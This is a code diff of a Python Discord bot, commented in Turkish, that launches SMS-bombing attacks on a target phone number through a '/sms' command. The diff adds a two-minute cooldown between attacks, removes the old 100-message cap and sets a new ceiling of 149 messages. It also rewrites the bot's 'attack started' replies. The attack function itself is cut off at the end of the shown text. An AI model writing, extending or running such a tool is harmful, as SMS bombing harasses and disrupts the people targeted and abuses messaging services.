@@ -680,6 +680,7 @@ token = os.getenv("DISCORD_TOKEN")
 chat_id = "1480908541320757410" 
 
 dur_bayragi = False
+son_gonderim_zamani = 0  # 2 dakika kuralı için değişken
 
 def discord_mesaj_gonder(kanal_id, mesaj):
     try:
@@ -689,7 +690,7 @@ def discord_mesaj_gonder(kanal_id, mesaj):
     except: pass
 
 def discord_dinle():
-    global dur_bayragi
+    global dur_bayragi, son_gonderim_zamani
     last_msg_id = None
     print(f"\n✅ Sunucu Modu Aktif! Bot sms.py üzerinden dinliyor...")
     
@@ -715,6 +716,13 @@ def discord_dinle():
                             discord_mesaj_gonder(kanal_id, "🛑 **Saldırı durduruldu.**")
 
                         elif content.startswith("/sms"):
+                            # --- 2 DAKİKA BEKLEME KONTROLÜ ---
+                            su_an = time.time()
+                            if su_an - son_gonderim_zamani < 120:
+                                kalan = int(120 - (su_an - son_gonderim_zamani))
+                                discord_mesaj_gonder(kanal_id, f"⏳ **Lütfen bekleyin!** Yeni saldırı için `{kalan}` saniye kaldı.")
+                                continue
+
                             parcalar = content.split()
                             if len(parcalar) >= 2:
                                 hedef_no = parcalar[1]
@@ -724,12 +732,18 @@ def discord_dinle():
                                 for p in parcalar:
                                     if "miktar:" in p.lower():
                                         try:
-                                            istenen = int(p.split(":")[1])
-                                            hedef_limit = 100 if istenen > 100 else istenen
+                                            hedef_limit = int(p.split(":")[1])
                                         except: pass
 
+                                # --- 150 LİMİT KONTROLÜ ---
+                                if hedef_limit >= 150:
+                                    discord_mesaj_gonder(kanal_id, "❌ **Limit aşıldı tekrar deneyiniz!** (Maksimum 149 SMS gönderebilirsiniz.)")
+                                    continue
+
+                                # --- BAŞARI MESAJI VE SALDIRI BAŞLATMA ---
                                 dur_bayragi = False
-                                discord_mesaj_gonder(kanal_id, f"🚀 **{hedef_no} numarasına {hedef_limit} SMS saldırısı başladı!**")
+                                son_gonderim_zamani = su_an
+                                discord_mesaj_gonder(kanal_id, f"✅ **Durum Başarılı!**\n🚀 Miktar: `{hedef_limit}`\n📱 Gönderim Başladı!")
                                 
                                 def saldiri_yap(num, limit, aktif_kanal):
                                     global dur_bayragi
